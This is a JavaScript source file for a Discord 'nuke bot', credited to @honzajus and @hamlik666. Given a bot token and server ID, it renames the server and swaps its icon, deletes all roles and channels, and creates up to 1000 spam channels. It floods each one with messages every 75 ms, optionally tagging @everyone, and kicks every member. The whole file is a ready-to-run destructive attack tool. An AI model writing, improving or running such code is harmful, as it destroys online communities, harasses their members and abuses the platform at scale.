const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits, EmbedBuilder } = require('discord.js');
const readline = require('readline-sync');
const chalk = require('chalk');
const figlet = require('figlet');
const terminalImage = require('terminal-image'); 

const rainbowText = (text) => {
  let colorIndex = 0;
  const colors = [
    chalk.red, chalk.yellow, chalk.green, chalk.cyan, chalk.blue, chalk.magenta
  ];
  return text.split('').map((char) => {
    const color = colors[colorIndex];
    colorIndex = (colorIndex + 1) % colors.length;
    return color(char);
  }).join('');
};

const setTerminalStyle = () => {
  console.log(chalk.bgBlack('')); 
};

const displayLogo = async () => {
  console.clear();


  console.log(chalk.green(figlet.textSync('H O N Z A J     N U K E      B O T', { font: 'big' })));
  console.log(rainbowText('Made by @honzajus. bug fixes by @hamlik666 (@honzajus).\n'));
};

(async () => {
  await displayLogo();
  setTerminalStyle();

  function greenText(text) {
    return chalk.bgBlack(chalk.green(text));
  } 

  const loadingBar = (duration, callback) => {
    const barLength = 60;
    let progress = 0;
    const interval = setInterval(() => {
      progress++;
      const progressBar = '[' + '='.repeat(progress) + ' '.repeat(barLength - progress) + ']';
      process.stdout.write(`\rLoading: ${progressBar} ${Math.floor((progress / barLength) * 100)}%`);
      if (progress === barLength) {
        clearInterval(interval);
        console.log('\n');
        callback();
      }
    }, duration);
  };

  const token = readline.question(chalk.hex('#ffffff')('Enter bot token: ')); 
  const guildId = readline.question(chalk.hex('#ffffff')('Enter server ID: ')); 
  const newName = readline.question(chalk.hex('#ffffff')('What should the channels be renamed to? ')); 
  const spamMessage = readline.question(chalk.hex('#ffffff')('What message should the bot spam in the channels? ')); 
  const numberOfChannels = readline.questionInt(chalk.hex('#ffffff')('How many new text channels should the bot create? '), { limit: '$<1-1000>' });

  const changeServerName = readline.keyInYNStrict(chalk.hex('#FFFF00')('Do you want to change the server name? (y/n)')); 
  let newServerName = null;

  if (changeServerName) {
    newServerName = readline.question(chalk.hex('#FFFF00')('Enter the new server name: ')); 
  }

  const changeIcon = readline.keyInYNStrict(chalk.hex('#FFFA500')('Do you want to change the server icon? (y/n)')); 
  let newServerIcon = null;

  if (changeIcon) {
    newServerIcon = readline.question(chalk.hex('#FFFA500')('Enter the Imgur link for the new server icon (e.g., https://i.imgur.com/example.png): ')); 
  }

  const deleteRoles = readline.keyInYNStrict(chalk.hex('#00ffff')('Do you want to delete all roles in the server? (y/n)')); 

  const tagEveryone = readline.keyInYNStrict(chalk.hex('#FF0000')('Do you want to tag @everyone in the spam message?')); 
  let messageToSpam = tagEveryone ? `||@everyone|| ${spamMessage}` : spamMessage; 

  const kickMembers = readline.keyInYNStrict(chalk.hex('#ff0000')('Do you want to kick members from the server?'));

  const client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.GuildMembers,
      GatewayIntentBits.GuildVoiceStates
    ]
  });

  client.once('ready', async () => {
    console.log(greenText('Bot is ready! Proceeding with the operation...\n'));

    try {
      const guild = await client.guilds.fetch(guildId);

      console.log(greenText(`Server name: ${guild.name}`));
      console.log(greenText(`Total members: ${guild.memberCount}`));
      console.log(greenText(`Total channels: ${guild.channels.cache.size}`));
      console.log(greenText(`Total roles: ${guild.roles.cache.size}`));
      console.log(greenText(`Server owner: ${guild.ownerId}\n`));

      const proceed = readline.keyInYNStrict(greenText('Do you want to proceed with nuking this server? '));
      if (!proceed) {
        console.log(greenText('Aborting operation...'));
        return;
      }

      console.log(greenText('\nLoading... Starting operation:'));
      await new Promise(resolve => loadingBar(100, resolve));

      console.log(greenText('Changing server name and icon...'));
      try {
        const editOptions = {};
        if (newServerName) {
          editOptions.name = newServerName;
        }
        if (newServerIcon) {
          editOptions.icon = newServerIcon;
        }
        if (Object.keys(editOptions).length > 0) {
          await guild.edit(editOptions);
          if (newServerName) {
            console.log(chalk.green(`✅ Server name changed to: ${newServerName}`));
          }
          if (newServerIcon) {
            console.log(chalk.green(`✅ Server icon updated.`));
          }
        } else {
          console.log(chalk.yellow(`⚠️ Server name and icon were not changed.`));
        }
      } catch (err) {
        console.log(chalk.red(`❌ Failed to update server name or icon: ${err.message}`));
      }

      if (deleteRoles) {
        console.log(greenText('Deleting all roles...'));
        const roles = guild.roles.cache.filter(role => !role.managed && role.editable);
        const deleteRolePromises = roles.map(async (role) => {
          try {
            await role.delete();
            console.log(chalk.hex('#FF4500')(`🌈 Deleted role: ${role.name}`)); 
          } catch (err) {
            console.log(chalk.red(`❌ Failed to delete role: ${role.name}`));
          }
        });
        await Promise.all(deleteRolePromises);
      }

      console.log(greenText('Deleting all channels...'));
      const channels = await guild.channels.fetch();
      const deletePromises = channels.map(async (channel) => {
        try {
          await channel.delete();
          console.log(chalk.red(`❌ Deleted channel: ${channel.name}`));
        } catch (err) {
          console.log(chalk.red(`❌ Failed to delete channel: ${channel.name}`));
        }
      });
      await Promise.all(deletePromises);

      console.log(greenText(`Creating ${numberOfChannels} new text channels...`));
      const createChannelsInBatches = async (guild, batchSize, totalChannels, channelName) => {
        let createdChannels = 0;

        while (createdChannels < totalChannels) {
          const batchPromises = [];
          for (let i = 0; i < batchSize && createdChannels < totalChannels; i++) {
            batchPromises.push(
              guild.channels.create({
                name: `${channelName}-${createdChannels + 1}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                  {
                    id: guild.id,
                    allow: [PermissionFlagsBits.SendMessages]
                  }
                ]
              })
            );
            createdChannels++;
          }
          const batchResults = await Promise.all(batchPromises);
          batchResults.forEach(channel => {
            console.log(chalk.green(`✅ Created channel: ${channel.name}`));
          });
        }
      };

      await createChannelsInBatches(guild, 100, numberOfChannels, newName); 

      console.log(greenText('\nStarting to spam messages in the new channels...'));
      const newChannels = await guild.channels.fetch();
      newChannels.forEach((channel) => {
        setInterval(async () => {
          try {
            await channel.send(messageToSpam);
            console.log(chalk.yellow(`📩 Spammed message in channel: ${channel.name}`));
          } catch (err) {
            console.log(chalk.red(`❌ Failed to send message in channel: ${channel.name}`));
          }
        }, 75); 
      });

      if (kickMembers) {
        console.log(greenText('Kicking all members from the server...\n'));
        const kickPromises = guild.members.cache.map(async (member) => {
          try {
            await member.kick('Kicked by Hamlik Nuke Bot');
            console.log(chalk.red(`❌ Kicked member: ${member.user.tag}`));
          } catch (err) {
            console.log(chalk.red(`❌ Failed to kick member: ${member.user.tag}`));
          }
        });
        await Promise.all(kickPromises);
      }

    } catch (err) {
      console.error(greenText(`❌ Error: ${err.message}`));
    }
  });

  client.login(token);
})();